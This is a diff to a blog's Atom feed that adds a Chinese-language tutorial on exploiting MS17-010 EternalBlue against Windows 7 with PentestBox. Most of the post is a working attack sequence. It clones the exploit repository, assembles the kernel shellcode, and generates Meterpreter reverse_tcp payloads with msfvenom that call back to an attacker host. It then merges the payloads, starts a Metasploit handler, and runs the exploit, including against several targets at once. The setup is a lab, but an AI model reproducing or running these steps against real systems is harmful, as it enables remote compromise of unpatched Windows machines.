@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://fuping.site/"/>
-  <updated>2017-07-26T02:00:30.932Z</updated>
+  <updated>2017-08-16T08:50:55.860Z</updated>
   <id>http://fuping.site/</id>
   
   <author>
@@ -14,6 +14,54 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>使用PentestBox工具利用ETERNALBLUE对Win7进行攻击，获取Meterpreter反弹</title>
+    <link href="http://fuping.site/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/"/>
+    <id>http://fuping.site/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/</id>
+    <published>2017-08-16T06:54:20.000Z</published>
+    <updated>2017-08-16T08:50:55.860Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将利用Python版本的ETERNALBLUE来实现对Win7进行攻击，获取Meterpreter反弹。<br><a id="more"></a></p>
+<p>靶机为Windows 7，IP为192.168.131.133。攻击机为Win10系统，安装了PentestBox，IP为192.168.217.1。</p>
+<h3 id="漏洞利用测试"><a href="#漏洞利用测试" class="headerlink" title="漏洞利用测试"></a>漏洞利用测试</h3><h4 id="1-安装NASM"><a href="#1-安装NASM" class="headerlink" title="1.安装NASM"></a>1.安装NASM</h4><p>下载地址：<a href="http://www.nasm.us/pub/nasm/releasebuilds/" target="_blank" rel="external">http://www.nasm.us/pub/nasm/releasebuilds/</a> ，我这里用的是<a href="http://www.nasm.us/pub/nasm/releasebuilds/2.13.01/win64/nasm-2.13.01-installer-x64.exe" target="_blank" rel="external">2.13</a>。<br>然后开始安装。</p>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/安装NASM.jpg" alt="安装NASM"></p>
+<p>安装完成后加入环境变量。</p>
+<h4 id="2-下载利用脚本，并编译内核shellcode"><a href="#2-下载利用脚本，并编译内核shellcode" class="headerlink" title="2.下载利用脚本，并编译内核shellcode"></a>2.下载利用脚本，并编译内核shellcode</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/worawit/MS17-010</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/下载脚本.jpg" alt="下载脚本"></p>
+<p>编译内核shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> MS17-010/shellcode/</div><div class="line">nasm <span class="_">-f</span> bin eternalblue_kshellcode_x64.asm</div><div class="line">nasm <span class="_">-f</span> bin eternalblue_kshellcode_x86.asm</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/编译ASM文件.jpg" alt="编译ASM文件"></p>
+<h4 id="3-生成反弹exp"><a href="#3-生成反弹exp" class="headerlink" title="3.生成反弹exp"></a>3.生成反弹exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4445 <span class="_">-f</span> raw -o ../../Git/MS17-010/shellcode/sc_x86_msf.bin</div><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  EXITFUNC=thread LHOST=192.168.217.1 LPORT=4444 <span class="_">-f</span> raw -o ../../Git/MS17-010/shellcode/sc_x64_msf.bin</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/生成反弹exp.jpg" alt="生成反弹exp"></p>
+<h4 id="4-合并SHELLCODE"><a href="#4-合并SHELLCODE" class="headerlink" title="4.合并SHELLCODE"></a>4.合并SHELLCODE</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cat eternalblue_kshellcode_x64 sc_x64_msf.bin &gt; sc_x64.bin</div><div class="line">cat eternalblue_kshellcode_x86 sc_x86_msf.bin &gt; sc_x86.bin</div><div class="line">python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/合并SHELLCODE.jpg" alt="合并SHELLCODE"></p>
+<h4 id="5-开启Metasploit并监听"><a href="#5-开启Metasploit并监听" class="headerlink" title="5.开启Metasploit并监听"></a>5.开启Metasploit并监听</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> EXITFUNC thread</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.217.1</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4444</div><div class="line">msf exploit(handler) &gt; exploit -j</div><div class="line">...</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4445</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/开启监听.jpg" alt="开启监听"></p>
+<h4 id="6-进行攻击"><a href="#6-进行攻击" class="headerlink" title="6.进行攻击"></a>6.进行攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/利用生成的脚本攻击.jpg" alt="利用生成的脚本攻击"></p>
+<p><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/攻击结果.jpg" alt="攻击结果"><br>看到已经获取Meterpreter反弹。</p>
+<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>在PentestBox中运行一些命令时(如msfconsole)，提示<code>不是内部或外部命令，也不是可运行的程序或批处理文件。</code><br>解决方法：输入<code>cmd</code>之后再输入需要执行的命令。<br><img src="/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/问题1.jpg" alt="问题1"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种方式利用稍微简单点，不需要过多的命令，而且生成的SHELLCODE也具有复用性。在以上的操作中，均生成了32位和64位的shellcode，最后利用eternalblue_sc_merge脚本合并到一起。然后在Eternalblue漏洞中利用合并的shellcode可以支持x86和x64，无需再检测目标体系结构。<br>在使用中设置了线程，可以同时对多个系统进行攻击测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python eternalblue_exploit7.py 192.168.131.133 shellcode\sc_all.bin</div><div class="line">python eternalblue_exploit7.py 192.168.131.134 shellcode\sc_all.bin</div><div class="line">python eternalblue_exploit7.py 192.168.131.135 shellcode\sc_all.bin</div><div class="line">python eternalblue_exploit7.py 192.168.131.136 shellcode\sc_all.bin</div></pre></td></tr></table></figure></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="https://github.com/worawit/MS17-010" target="_blank" rel="external">https://github.com/worawit/MS17-010</a><br>[2]<a href="https://www.exploit-db.com/docs/42280.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/42280.pdf</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将利用Python版本的ETERNALBLUE来实现对Win7进行攻击，获取Meterpreter反弹。&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Exploit" scheme="http://fuping.site/categories/Exploit/"/>
+    
+    
+      <category term="MS17-010" scheme="http://fuping.site/tags/MS17-010/"/>
+    
+      <category term="PentestBox" scheme="http://fuping.site/tags/PentestBox/"/>
+    
+      <category term="Metasploit" scheme="http://fuping.site/tags/Metasploit/"/>
+    
+  </entry>
   
   <entry>
     <title>SQLite手工注入Getshell技巧</title>
@@ -678,9 +726,9 @@
     
       <category term="MS17-010" scheme="http://fuping.site/tags/MS17-010/"/>
     
-      <category term="Ngrok" scheme="http://fuping.site/tags/Ngrok/"/>
-    
       <category term="Metasploit" scheme="http://fuping.site/tags/Metasploit/"/>
+    
+      <category term="Ngrok" scheme="http://fuping.site/tags/Ngrok/"/>
     
   </entry>
   
